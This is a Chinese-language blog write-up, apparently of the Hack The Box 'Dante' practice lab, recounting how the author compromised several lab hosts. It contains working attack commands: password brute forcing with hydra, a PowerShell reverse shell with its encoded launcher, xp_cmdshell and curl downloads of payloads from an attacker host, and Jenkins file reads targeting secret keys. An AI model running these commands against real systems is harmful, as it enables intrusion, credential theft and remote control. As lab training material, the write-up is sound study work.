+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos&#x3D;6|7|8,[ ubuntu&#x3D;14|16|17|18|19|20 ], debian&#x3D;9|10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;worawit&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https:&#x2F;&#x2F;google.github.io&#x2F;security-research&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;writeup.html
+   Exposure: probable
+   Tags: [ ubuntu&#x3D;20.04 ]&#123;kernel:5.8.0-*&#125;
+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;google&#x2F;security-research&#x2F;master&#x2F;pocs&#x2F;linux&#x2F;cve-2021-22555&#x2F;exploit.c
+   ext-url: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;bcoles&#x2F;kernel-exploits&#x2F;master&#x2F;CVE-2021-22555&#x2F;exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2022&#x2F;09&#x2F;01&#x2F;settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250&#x2F;
+https:&#x2F;&#x2F;blog.theori.io&#x2F;research&#x2F;CVE-2022-32250-linux-kernel-lpe-2022&#x2F;
+   Exposure: less probable
+   Tags: ubuntu&#x3D;(22.04)&#123;kernel:5.15.0-27-generic&#125;
+   Download URL: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;theori-io&#x2F;CVE-2022-32250-exploit&#x2F;main&#x2F;exp.c
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们继续使用这个<code>PwnKit</code>漏洞进行提权，将漏洞利用文件下载下来，上传上服务器，然后利用即可提权：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219223452084.png" alt="image-20250219223452084"></p>
+<p>然后将fscan上传上去扫描下有没有新的机器，扫描出如下结果：</p>
+<pre class="line-numbers language-none"><code class="language-none"># .&#x2F;fscan -h 172.16.2.1&#x2F;24
+
+   ___                              _    
+  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ 
+ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;
+&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;    
+\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 2.0.0
+[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
+[*] 开始信息扫描...
+[*] CIDR范围: 172.16.2.0-172.16.2.255
+[*] 已生成IP范围: 172.16.2.0 - 172.16.2.255
+[*] 已解析CIDR 172.16.2.1&#x2F;24 -&gt; IP范围 172.16.2.0-172.16.2.255
+[*] 最终有效主机数量: 256
+[+] 目标 172.16.2.101    存活 (ICMP)
+[+] 目标 172.16.2.5      存活 (ICMP)
+[+] 目标 172.16.2.6      存活 (ICMP)
+[+] ICMP存活主机数量: 3
+[*] 共解析 218 个有效端口
+[+] 端口开放 172.16.2.6:22
+[+] 端口开放 172.16.2.5:445                                                                         
+[+] 端口开放 172.16.2.5:139                                                                         
+[+] 端口开放 172.16.2.5:135                                                                         
+[+] 端口开放 172.16.2.5:88                                                                          
+[+] 端口开放 172.16.2.101:22                                                                        
+[+] 存活端口数量: 6                                                                                 
+[*] 开始漏洞扫描...
+[!] 扫描错误 172.16.2.5:445 - read tcp 172.16.2.101:34404-&gt;172.16.2.5:445: read: connection reset by peer
+[*] NetBios 172.16.2.5      [+] DC:DANTE\DANTE-DC02        
+[*] NetInfo
+[*] 172.16.2.5
+   [-&gt;] DANTE-DC02
+   [-&gt;] 172.16.2.5
+[!] 扫描错误 172.16.2.5:88 - Get &quot;http:&#x2F;&#x2F;172.16.2.5:88&quot;: read tcp 172.16.2.101:51380-&gt;172.16.2.5:88: read: connection reset by peer
+[!] 扫描错误 172.16.2.6:22 - 扫描总时间超时: context deadline exceeded
+[!] 扫描错误 172.16.2.101:22 - 扫描总时间超时: context deadline exceeded
+[+] 扫描已完成: 6&#x2F;6
+[*] 扫描结束,耗时: 12.098649778s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>出现了一个<code>172.16.2.6</code>，然后开放端口只有22，我们继续向下进行渗透</p>
+<h4 id="172-16-2-6"><a href="#172-16-2-6" class="headerlink" title="172.16.2.6"></a>172.16.2.6</h4><p>依旧先想办法搭个代理出来，三成代理，现在是：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219225657314.png" alt="image-20250219225657314"></p>
+<p>搭建成功时候依旧还是进行ssh密码爆破，因为只开放了22端口：</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 hydra -L users1.txt -P password.txt ssh:&#x2F;&#x2F;172.16.2.6 -t 2 -W 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里我们需要降低速度，因为这个三成代理非常不稳定，我也不知道为什么，爆破速度一快就容易断连，最后爆出的密码与<code>172.16.2.101</code>一样：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219230136653.png" alt="image-20250219230136653"></p>
+<p>密码是<code>julian|manchesterunited</code>、<code>plongbottom|PowerfixSaturdayClub777</code>，现在我们依旧登陆下：</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 ssh julian@172.16.2.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在桌面查看到一个SQL文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">julian@DANTE-ADMIN-NIX06:~&#x2F;Desktop$ cat SQL
+Hi Julian
+I&#39;ve put this on your personal desktop as its probably the most secure 
+place on the network!
+
+Can you please ask Sophie to change her SQL password when she logs in
+again? I&#39;ve reset it to TerrorInflictPurpleDirt996655 as it stands, but
+obviously this is a tough one to remember
+
+Maybe we should all get password managers?
+
+Thanks,
+James<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>找到一个密码，留着备用，检查之后没有简单的可提权的点，切换下另一个账户，在这个账户中发现能够以root权限执行，所以能够sudo提权：</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo sudo &#x2F;bin&#x2F;sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219232852786.png" alt="image-20250219232852786"></p>
+<p>提权成功，获取最后flag：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219233012997.png" alt="image-20250219233012997"></p>
+<p>检查下是否存在其他子网，或是其他ip，我们直接上传fscan扫描</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219233355080.png" alt="image-20250219233355080"></p>
+<p>到此，这个域就算渗透成功，爆爽！</p>
+<h3 id="172-16-1-17"><a href="#172-16-1-17" class="headerlink" title="172.16.1.17"></a>172.16.1.17</h3><p>扫描结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216191542933.png" alt="image-20250216191542933"></p>
+<p>开放了80和10000端口，我们先看一眼80端口，发现存在一个zip文件，我们先将其下载下来，再进行分析：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216191813053.png" alt="image-20250216191813053"></p>
+<p>下载后发现源代码是<code>webmin</code>的<code>1.900</code>版本的源代码，除此之外没找到其他有用的东西，然后10000端口就是正常的webmin的服务，需要登陆，没有密码，我们考虑密码爆破和现有漏洞的利用，我们先搜索下现有的漏洞：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216202049259.png" alt="image-20250216202049259"></p>
+<p>但是经过检查之后我发现都需要账号和密码，所以我们先进性密码爆破，看看能不能爆出密码，我们通过burp爆破出最后的密码为</p>
+<p><code>Password6543</code></p>
+<p>然后我们直接用msf的webmin相关的脚本进行渗透，我这里用的是下面的漏洞：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce
+set rhost 172.16.1.17
+set lhost 10.10.17.141
+set lport 6666
+set payload set payload cmd&#x2F;unix&#x2F;reverse_netcat
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后我们就能成功：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217020518243.png" alt="image-20250217020518243"></p>
+<p>然后直接反弹shell出来，在root目录中找到了我们的flag，这台机器也就完成了：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217023208508.png" alt="image-20250217023208508"></p>
+<h3 id="172-16-1-19"><a href="#172-16-1-19" class="headerlink" title="172.16.1.19"></a>172.16.1.19</h3><p>扫描结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217023325287.png" alt="image-20250217023325287"></p>
+<p>我们能够看到8080是一个Jenkins 2.24版本的服务，访问页面是一个登陆界面，我们先搜索现有漏洞看看是否能利用：</p>
+<p>我们搜索到一个任意文件读取的漏洞，参考<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.zh-cn.md">Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</a>这篇文章，我们直接通过这个漏洞进行文件读取：</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http help 1 &quot;@&#x2F;proc&#x2F;self&#x2F;environ&quot;    &#x2F;&#x2F;看文件目标路径
+proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http help 1 &quot;@&#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;secret.key&quot;  &#x2F;&#x2F;读取密钥
+proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http help 1 &quot;@&#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;secrets&#x2F;master.key&quot;  &#x2F;&#x2F;查看加密内容
+proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http connect-node &quot;@&#x2F;etc&#x2F;passwd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>不过没什么用，没有权限读文件选读文件,我们从上面的渗透中得到了一个jenkins的密码<code>Admin_129834765:SamsungOctober102030</code>，用这个密码登陆下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219235035042.png" alt="image-20250219235035042"></p>
+<p>登陆成功获取第一个flag，然后我们参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry666/p/16927188.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%EF%BC%8C%E7%84%B6%E5%90%8Ewget%E4%B8%8B%E8%BD%BDelf%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%B8%8A%E7%BA%BF%EF%BC%9A">https://www.cnblogs.com/henry666/p/16927188.html这篇文章进行反弹shell，然后wget下载elf文件进行上线：</a></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220002959750.png" alt="image-20250220002959750"></p>
+<p>然后进行提权漏洞扫描：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220004423795.png" alt="image-20250220004423795"></p>
+<p>最后使用<code>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec </code>模块提权成功<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220004513829.png" alt="image-20250220004513829"></p>
+<p>然后检查了下这台机器没有其他网段，这台也就完成了。</p>
+<h3 id="172-16-1-5"><a href="#172-16-1-5" class="headerlink" title="172.16.1.5"></a>172.16.1.5</h3><p>扫描结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217181401974.png" alt="image-20250217181401974"></p>
+<p>没有web端口开放，但是445端口开放了，我们先看看能不能进行smb的匿名登陆</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217184247812.png" alt="image-20250217184247812"></p>
+<p>不能进行匿名登陆，然后再看看ftp能不能匿名登陆，发现成功匿名登陆，获得第一个flag：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217200331438.png" alt="image-20250217200331438"></p>
+<p>然后由于他开放了1433端口，我们在上面的渗透中获取到了一个数据库的账号和密码，我们尝试登陆下<code>Sophie|TerrorInflictPurpleDirt996655</code>：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220010456858.png" alt="image-20250220010456858"></p>
+<p>发现成功登入，我们看看其中的数据，和尝试写马，为了方便进行操作。这里通msf来进行操作，先通过<code>impacket-mssqlclient </code>工具将马下载上去:</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-mssqlclient Sophie@172.16.1.5
+EXEC xp_cmdshell &quot;mkdir c:\temp&quot;;
+EXEC xp_cmdshell &#39;certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.17.141:7412&#x2F;shell.exe C:\temp\file.exe&#39;;
+EXEC xp_cmdshell &quot;c:\temp\file.exe&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后获取木马，直接getsystem即可：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220021931879.png" alt="image-20250220021931879"></p>
+<h3 id="172-16-1-1"><a href="#172-16-1-1" class="headerlink" title="172.16.1.1"></a>172.16.1.1</h3><p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218022830212.png" alt="image-20250218022830212"></p>
+<h3 id="172-16-1-101"><a href="#172-16-1-101" class="headerlink" title="172.16.1.101"></a>172.16.1.101</h3><p>扫描结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218005548479.png" alt="image-20250218005548479"></p>
+<p>发现只有47001一个端口有web服务，但查看后是404并且扫描后也无结果，所以我们先从smb服务和ftp服务入手，测试之后无法进行匿名登陆</p>
+<p>我们加上之前的机器的获得的账号和密码，来进行下ftp密码爆破</p>
+<pre class="line-numbers language-none"><code class="language-none">asmith:Princess1
+smoggat:Summer2019
+tmodle:P45678!
+ccraven:Password1
+kploty:Teacher65
+jbercov:4567Holiday1
+whaguey:acb123
+dcamtan:WorldOfWarcraft67
+tspadly:RopeBlackfieldForwardslash
+ematlis:JuneJuly1TY
+fglacdon:FinalFantasy7
+tmentrso:65RedBalloons
+dharding:WestminsterOrange5
+smillar:MarksAndSparks91
+bjohnston:Bullingdon1
+iahmed:Sheffield23
+plongbottom:PowerfixSaturdayClub777
+jcarrot:Tanenbaum0001
+lgesley:SuperStrongCantForget123456789
+julian:manchesterunited
+ben:Welcometomyblog
+balthazar:TheJoker12345!
+mrb3n:S3kur1ty2020!
+Admin_129834765:SamsungOctober102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 hydra -C test1.txt 172.16.1.101 ftp -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218212910566.png" alt="image-20250218212910566"></p>
+<p>最后密码为：<code>dharding:WestminsterOrange5</code>这一组，我们登陆下，登陆后发现一个<code>Remote login.txt</code>文件</p>
+<pre class="line-numbers language-none"><code class="language-none">Dido,
+I&#39;ve had to change your account password due to some security issues we have recently become aware of
+
+It&#39;s similar to your FTP password, but with a different number (ie. not 5!)
+
+Come and see me in person to retrieve your password.
+
+thanks,
+James<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后我们直接挨个试一遍就行了，尾数字除了5，直接用1-100先试一下，发现17成功</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218220402379.png" alt="image-20250218220402379"></p>
+<p>然后我们直接winRM登陆即可：</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>登陆后发现第一个flag，然后我们用msf上线，方便后续提权：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218221923139.png" alt="image-20250218221923139"></p>
+<p>然后进行提权漏洞扫描</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218222327174.png"></p>
+<p>挨个尝试下，最后全试了一遍，也没能成功，所以我们上传下<code>PowerSharpPack</code>来进行漏洞扫描</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17 -s &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;tool&#x2F;PowerSharpPack&#x2F;PowerSharpBinaries
+
+
+Bypass-4MSI
+Invoke-winPEAS.ps1
+Invoke-winPEAS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>扫描出来下面的关键点</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219051853836.png" alt="image-20250219051853836"></p>
+<p>搜索下之后我们发现存在历史漏洞：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219052100295.png" alt="image-20250219052100295"></p>
+<p>我们先反弹shell出来，用于我们后续进行提权：</p>
+<pre class="line-numbers language-none"><code class="language-none">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.17.141&#39;,9001);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>构建bat文件</p>
+<pre class="line-numbers language-none"><code class="language-none">@echo off
+start &#x2F;b powershell.exe -exec bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA3AC4AMQA0ADEAJwAsADkAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA 
+exit &#x2F;b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>将文件下载到机器上:</p>
+<pre class="line-numbers language-none"><code class="language-none">(New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.17.141:7412&#x2F;test.bat&#39;,&#39;C:\Users\dharding\Documents\test.bat&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最后利用漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">sc.exe stop IObitUnSvr
+sc.exe config IObitUnSvr binPath&#x3D;&quot;cmd.exe &#x2F;c c:\temp\runme.bat&quot;
+sc.exe qc IObitUnSvr
+sc.exe start IObitUnSvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>本地起监听：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set PAYLOAD windows&#x2F;shell_reverse_tcp
+set LHOST 10.10.14.5
+set LPORT 9001
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后成功：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219210939300.png" alt="image-20250219210939300"></p>
+<p>同时该台机器也不属于域环境中，这台机器也就结束了：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219211107928.png" alt="image-20250219211107928"></p>
+<h3 id="172-16-1-102"><a href="#172-16-1-102" class="headerlink" title="172.16.1.102"></a>172.16.1.102</h3><p>扫描结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217234019908.png" alt="image-20250217234019908"></p>
+<p>存在web端口开放，我们先看一眼这个web端口是什么服务，访问之后发现是一个在线婚姻登记系统，有一个管理员登陆和用户登陆，不过登陆上去没有什么用，上传有限制：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217234516426.png" alt="image-20250217234516426"></p>
+<p>我们搜索下这个框架的漏洞，能够搜索到这样一个exp，<a target="_blank" rel="noopener" href="https://github.com/ricardojoserf/omrs-rce-exploit">在线婚姻注册系统（OMRS）1.0-远程代码执行</a></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217235307163.png" alt="image-20250217235307163"></p>
+<p>然后我们就能正常进行命令执行：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218001121187.png" alt="image-20250218001121187"></p>
+<p>然后我们也获取了账号和密码<code>552938962</code>|<code>dante123</code> ，然后我们通过从本机下载然后给机器上个马，方便我们后续提权</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.10.17.141 LPORT&#x3D;6666 -f exe -o shell.exe
+use exploit&#x2F;multi&#x2F;handler
+set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 10.10.17.141
+set LPORT 6666
+exploit -j
+
+proxychains4 python3 exp.py -u http:&#x2F;&#x2F;172.16.1.102:80&#x2F; -c &#39;curl -o shell.exe http:&#x2F;&#x2F;10.10.17.141:7412&#x2F;shell.exe&#39;
+proxychains4 python3 exp.py -u http:&#x2F;&#x2F;172.16.1.102:80&#x2F; -c &#39;C:\Apache24\htdocs\user\images\shell.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后就成功上线：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218003437793.png" alt="image-20250218003437793"></p>
+<p>然后利用msf的模块进行提权：</p>
+<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最后通过下面的模块成功提权</p>
+<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;windows&#x2F;local&#x2F;cve_2023_28252_clfs_driver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218005027221.png" alt="image-20250218005027221"></p>
+<p>然后看了路由表和systeminfo，能够发现其并没有新的域，这台机器也就算是完成了</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218005427059.png" alt="image-20250218005427059"></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>用时大约半个月，终于完成了这系列靶机，这些靶机还是非常适合像我这种新手练习的，在本套靶机中，我是收益最大的是完整的搭了一次三层代理，我在搭代理的时候，总是有这样那样的问题，最终在各种ai的帮助下，属于是磕磕绊绊的完成了，非常好玩。</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220022213774.png" alt="image-20250220022213774"></p>
+<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p>非常感谢这位师傅的文章，帮了我非常的多</p>
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/pentest/2024/01/02/HTB-Prolab-Dante.html#windows-1721615">https://dummykitty.github.io/pentest/2024/01/02/HTB-Prolab-Dante.html#windows-1721615</a></p>
